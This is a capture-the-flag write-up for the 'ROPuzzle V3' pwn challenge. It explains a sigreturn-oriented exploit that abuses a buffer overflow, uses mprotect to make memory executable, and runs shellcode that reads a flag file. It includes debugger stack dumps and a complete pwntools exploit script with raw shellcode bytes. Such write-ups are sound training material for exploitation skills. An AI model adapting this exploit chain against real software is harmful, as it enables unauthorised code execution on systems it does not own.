# ROPuzzle V3
![](https://img.shields.io/badge/category-pwn-blue)
![](https://img.shields.io/badge/points-400-orange)

## Description
Remember when I said I found the smallest binary? I was wrong! THIS is the smallest binary!

`nc ctf.joshl.ca 5000`

[ROPuzzleV3.zip](https://ctf.mcpt.ca/media/problem/1nAwhK1XyccZscKTOtQuIk1xvXgq3qUMfhJ-fG9fnFk/ROPuzzleV3.zip)

## Solution
The binary is very small. We have a buffer overflow, but no gadgets and no libc to jump to.

Actually, we do have a `syscall` gadget available. This can let us do a `sigreturn` syscall, giving us complete code execution - as long as we can set `rax` to 15, the syscall number for sigreturn. However, this doesn't seem possible, since there are no rax gadgets. Luckily, it is, because rax is not cleared after syscalls. And the read syscall returns the number of bytes read, in rax. So if we only get the program to read in 15 bytes, then rax will be set up properly.

However, 15 bytes is too little to do anything with. We can overcome this by reading in our full input, returning back to the start of the get_input function, reading 15 bytes, returning to the syscall gadget, giving us a sigreturn. Success!!

This is wonderful and all, but we still need to be able to either get a shell or print the flag after the sigreturn. Trying to get a shell won't work in Alpine linux (the distro used in the challenge), so our only option is to print the flag, which will require us to enter shellcode, which means we need a segment in the program that allows read, write, and execute.

Then, our exploit is:

1. get_input 1: we overwrite the return address to the start of get_input so that we can set up the rax register later, and also write the sigreturn frame (used later) onto the stack. The sigreturn frame will setup a `mprotect(0x400000, 0x1000, 7)` call (0x400000 is a safe location), and also shift the stack to somewhere in the 0x400000 range.

<details>
<summary>What the stack looks like after this step</summary>

```
[-------------------------------------code-------------------------------------]
   0x40101b <get_input+17>:     mov    edx,0x1000
   0x401020 <get_input+22>:     syscall 
   0x401022 <get_input+24>:     add    rsp,0x8
=> 0x401026 <get_input+28>:     ret    
   0x401027 <exit>:     mov    eax,0x3c
   0x40102c <exit+5>:   mov    edi,0x0
   0x401031 <exit+10>:  syscall 
   0x401033 <exit+12>:  call   0x401027 <exit>
[------------------------------------stack-------------------------------------]
0000| 0x7fff1498c638 --> 0x40100a (<get_input>: sub    rsp,0x8)     <== overwritten return address
0008| 0x7fff1498c640 --> 0x0                                        <== 0 (empty on purpose, we overwrite this step 2)
0016| 0x7fff1498c648 --> 0x0                                        <=\
0024| 0x7fff1498c650 --> 0x0                                        <=| 
0032| 0x7fff1498c658 --> 0x0                                        <== the sigreturn
0040| 0x7fff1498c660 --> 0x0                                        <== frame
0048| 0x7fff1498c668 --> 0x0                                        <=|
0056| 0x7fff1498c670 --> 0x0                                        <=/
[------------------------------------------------------------------------------]
```
</details>

2. get_input 2: Write 15 bytes, so that rax is set to 15 (syscall number for sigreturn). We should also overwrite the return address again so that it points to the `syscall` instruction in get_input.

<details>
<summary>What the stack looks like after this step</summary>

```
[-------------------------------------code-------------------------------------]
   0x40101b <get_input+17>:     mov    edx,0x1000
   0x401020 <get_input+22>:     syscall 
   0x401022 <get_input+24>:     add    rsp,0x8
=> 0x401026 <get_input+28>:     ret    
   0x401027 <exit>:     mov    eax,0x3c
   0x40102c <exit+5>:   mov    edi,0x0
   0x401031 <exit+10>:  syscall 
   0x401033 <exit+12>:  call   0x401027 <exit>
[------------------------------------stack-------------------------------------]
0000| 0x7fff1498c640 --> 0x401020 (<get_input+22>:      syscall)    <== overwritten return address
0008| 0x7fff1498c648 --> 0x0                                        <=\
0016| 0x7fff1498c650 --> 0x0                                        <=|
0024| 0x7fff1498c658 --> 0x0                                        <=|
0032| 0x7fff1498c660 --> 0x0                                        <== sigreturn frame
0040| 0x7fff1498c668 --> 0x0                                        <=|
0048| 0x7fff1498c670 --> 0x0                                        <=|
0056| 0x7fff1498c678 --> 0x0                                        <=/
[------------------------------------------------------------------------------]
```
</details>

3. Program returns to syscall and does the sigreturn. The registers are now set up for the mprotect syscall.

<details>
<summary>What the stack looks like after this step</summary>

```
[----------------------------------registers-----------------------------------]
RAX: 0xa ('\n')
RBX: 0x0 
RCX: 0x0 
RDX: 0x7 
RSI: 0x1000 
RDI: 0x400000 --> 0x10102464c457f 
RBP: 0x0 
RSP: 0x400010 --> 0x1003e0002 
RIP: 0x401020 (<get_input+22>:  syscall)
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x0 
R12: 0x0 
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401013 <get_input+9>:      mov    edi,0x0
   0x401018 <get_input+14>:     mov    rsi,rsp
   0x40101b <get_input+17>:     mov    edx,0x1000
=> 0x401020 <get_input+22>:     syscall 
   0x401022 <get_input+24>:     add    rsp,0x8
   0x401026 <get_input+28>:     ret    
   0x401027 <exit>:     mov    eax,0x3c
   0x40102c <exit+5>:   mov    edi,0x0
Guessed arguments:
arg[0]: 0x400000 --> 0x10102464c457f 
arg[1]: 0x1000 
arg[2]: 0x7 
[------------------------------------stack-------------------------------------]
0000| 0x400010 --> 0x1003e0002 
0008| 0x400018 --> 0x401000 (<_start>:  call   0x40100a <get_input>)
0016| 0x400020 --> 0x40 ('@')
0024| 0x400028 --> 0x1150 
0032| 0x400030 --> 0x38004000000000 ('')
0040| 0x400038 --> 0x4000500400002 
0048| 0x400040 --> 0x400000001 
0056| 0x400048 --> 0x0 
[------------------------------------------------------------------------------]
```
</details>

4. The mprotect is called, creating a section of `rwx` memory. Then, we return to the main address conveniently in our safe space.

<details>
<summary>What the stack looks like after this step</summary>

```
[-------------------------------------code-------------------------------------]
   0x40101b <get_input+17>:     mov    edx,0x1000
   0x401020 <get_input+22>:     syscall 
   0x401022 <get_input+24>:     add    rsp,0x8
=> 0x401026 <get_input+28>:     ret    
   0x401027 <exit>:     mov    eax,0x3c
   0x40102c <exit+5>:   mov    edi,0x0
   0x401031 <exit+10>:  syscall 
   0x401033 <exit+12>:  call   0x401027 <exit>
[------------------------------------stack-------------------------------------]
0000| 0x400018 --> 0x401000 (<_start>:  call   0x40100a <get_input>)
0008| 0x400020 --> 0x40 ('@')
0016| 0x400028 --> 0x1150 
0024| 0x400030 --> 0x38004000000000 ('')
0032| 0x400038 --> 0x4000500400002 
0040| 0x400040 --> 0x400000001 
0048| 0x400048 --> 0x0 
0056| 0x400050 --> 0x400000 --> 0x10102464c457f 
[------------------------------------------------------------------------------]
```
</details>
    
5. Read input into our new stack at 0x400000 and return to our shellcode in there

<details>
<summary>What the stack looks like after this step</summary>

```
[-------------------------------------code-------------------------------------]
   0x401018 <get_input+14>:     mov    rsi,rsp
   0x40101b <get_input+17>:     mov    edx,0x1000
   0x401020 <get_input+22>:     syscall 
=> 0x401022 <get_input+24>:     add    rsp,0x8
   0x401026 <get_input+28>:     ret    
   0x401027 <exit>:     mov    eax,0x3c
   0x40102c <exit+5>:   mov    edi,0x0
   0x401031 <exit+10>:  syscall
[------------------------------------stack-------------------------------------]
0000| 0x400010 ("flag.txt ")                                <== the string "flag.txt" (not null terminated, is a problem)
0008| 0x400018 --> 0x400020 --> 0x400018250489c031          <== our fake return address, return to 0x400020
0016| 0x400020 --> 0x400018250489c031                       <== shellcode, starting here, that prints the flag
0024| 0x400028 --> 0x10bf00000002b800 
0032| 0x400030 --> 0xfd231f631004000 
0040| 0x400038 --> 0x500bec031c78905 
0048| 0x400040 --> 0xf00000064ba0040 
0056| 0x400048 --> 0x1bf00000001b805 
[------------------------------------------------------------------------------]
```
</details>

```py
from pwn import *

context.arch = 'amd64'

if args.LOCAL:
    p = process("./main")
else:
    p = remote("ctf.joshl.ca", 5000)

# Important addresses
input_addr = 0x000000000040100a
syscall = 0x401020

# Payload 1: 8 bytes garbage + return address + garbage + sigreturn frame
pay = b'A'*8 + p64(input_addr) + p64(0)
frame = SigreturnFrame() # mprotect(0x400000, 0x1000, 7)
frame.rax = 10
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = 0x400010        # our new stack exists here, because this address
                            # contains the address of main, which we'll need to
                            # return to
frame.rip = syscall

pay += bytes(frame)

p.send(pay)
with open('in', 'wb') as f:
    f.write(pay)

pause()

# At this point, the payload 1 is read, the program jumped back to the start of read_input, and our full payload is on the stack

# Payload 2: 15 bytes, make sure we overwrite the return pointer back to syscall
pay = b'A'*8 + p64(syscall)
pay = pay[:15]

with open('in', 'ab') as f:
    f.write(pay)
p.send(pay)
pause()

# At this point, rax = 15, we return to the syscall, which performs the sigreturn syscall, returning back to the
# sigreturn syscall (controlled by frame.rip), making the mprotect syscall, then returning into the address pointed
# to by frame.rsp (start of main), which calls read_input again - but now the stack is at our special location.

# Payload 3:
# 0x400010: "flag.txt"
# 0x400018: overwriting the return address to go to 0x400020
# 0x400020: our shellcode
# The first and second instructions are important because we need to make sure the first byte after "flag.txt"
# is a null byte, but it contains 0x400020 right now. To fix this, we can just move 0 to 0x400018.
"""
   0:   31 c0                   xor    eax, eax
   2:   89 04 25 18 00 40 00    mov    dword[0x400018], eax
   9:   b8 02 00 00 00          mov    eax, 0x2
   e:   bf 10 00 40 00          mov    edi, 0x400010
  13:   31 f6                   xor    esi, esi
  15:   31 d2                   xor    edx, edx
  17:   0f 05                   syscall                 ; int fd = open("flag.txt", "r", "r")
  19:   89 c7                   mov    edi, eax
  1b:   31 c0                   xor    eax, eax
  1d:   be 00 05 40 00          mov    esi, 0x400500    ; known safe address
  22:   ba 64 00 00 00          mov    edx, 0x64
  27:   0f 05                   syscall                 ; read(fd, 0x400500, 0x64)
  29:   b8 01 00 00 00          mov    eax, 0x1
  2e:   bf 01 00 00 00          mov    edi, 0x1
  33:   be 00 05 40 00          mov    esi, 0x400500
  38:   ba 64 00 00 00          mov    edx, 0x64
  3d:   0f 05                   syscall                 ; write(stdout, 0x400500, 0x64)
"""
pay = b'flag.txt' + p64(0x400020) + b'\x31\xc0\x89\x04\x25\x18\x00\x40\x00\xb8\x02\x00\x00\x00\xbf\x10\x00\x40\x00\x31\xf6\x31\xd2\x0f\x05\x89\xc7\x31\xc0\xbe\x00\x05\x40\x00\xba\x64\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\xbe\x00\x05\x40\x00\xba\x64\x00\x00\x00\x0f\x05'

with open('in', 'ab') as f:
    f.write(pay)
p.send(pay)
pause()
p.interactive()
```

Flag: `CTF{Best_use_of_srop_i_have_seen_so_far!}`
